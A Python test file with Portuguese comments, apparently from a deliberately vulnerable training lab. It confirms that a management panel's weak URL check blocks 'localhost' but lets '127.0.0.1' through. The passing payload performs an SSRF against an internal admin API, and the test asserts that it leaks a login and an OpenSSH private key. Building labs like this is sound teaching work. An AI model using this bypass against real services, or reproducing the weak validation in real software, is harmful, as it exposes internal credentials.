"""Teste de camada 2: usa app.test_client() do painel de gerenciamento para
validar a lógica do SSRF, com a admin-api rodando como processo real (a
requisição sai de verdade pela rede, então não dá para usar test_client dos
dois lados).

Cobre também o bypass da validação fraca (bloqueia "localhost" mas não
"127.0.0.1").
"""

import os
import subprocess
import sys
import time

import requests

TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
ADMIN_API_DIR = os.path.join(TESTS_DIR, "..", "services", "admin-api")
PAINEL_DIR = os.path.join(TESTS_DIR, "..", "services", "painel-gerenciamento")
ADMIN_API_PORT = 9090

sys.path.insert(0, PAINEL_DIR)
import app as painel_app  # noqa: E402


def subir_admin_api():
    processo = subprocess.Popen(
        [sys.executable, "app.py"],
        cwd=ADMIN_API_DIR,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    for _ in range(30):
        try:
            requests.get(f"http://127.0.0.1:{ADMIN_API_PORT}/healthz", timeout=0.5)
            return processo
        except requests.RequestException:
            time.sleep(0.2)
    processo.terminate()
    raise RuntimeError("admin-api não respondeu a tempo")


def main():
    processo_admin_api = subir_admin_api()
    try:
        client = painel_app.app.test_client()

        # Caso 1: "localhost" é bloqueado pela validação fraca.
        resposta_bloqueada = client.post(
            "/verificar-integracao",
            data={"endpoint": f"http://localhost:{ADMIN_API_PORT}/admin/credenciais"},
        )
        corpo_bloqueado = resposta_bloqueada.get_data(as_text=True)
        assert "Domínio bloqueado" in corpo_bloqueado, "validação fraca não bloqueou 'localhost' como esperado"
        print("[OK] endpoint com 'localhost' é bloqueado pela validação do painel.")

        # Caso 2: "127.0.0.1" passa pela mesma validação (bypass esperado) e
        # a SSRF de fato acontece, vazando a credencial da admin-api.
        resposta_ssrf = client.post(
            "/verificar-integracao",
            data={"endpoint": f"http://127.0.0.1:{ADMIN_API_PORT}/admin/credenciais"},
        )
        corpo_ssrf = resposta_ssrf.get_data(as_text=True)
        assert resposta_ssrf.status_code == 200
        assert "operador_caixa" in corpo_ssrf
        assert "BEGIN OPENSSH PRIVATE KEY" in corpo_ssrf
        print("[OK] endpoint com '127.0.0.1' passa pela validação (bypass) e a SSRF vaza a credencial.")
        print("[OK] Etapa 3 (SSRF) validada na camada Flask: painel -> admin-api -> credencial vazada.")

    finally:
        processo_admin_api.terminate()
        processo_admin_api.wait(timeout=5)


if __name__ == "__main__":
    main()
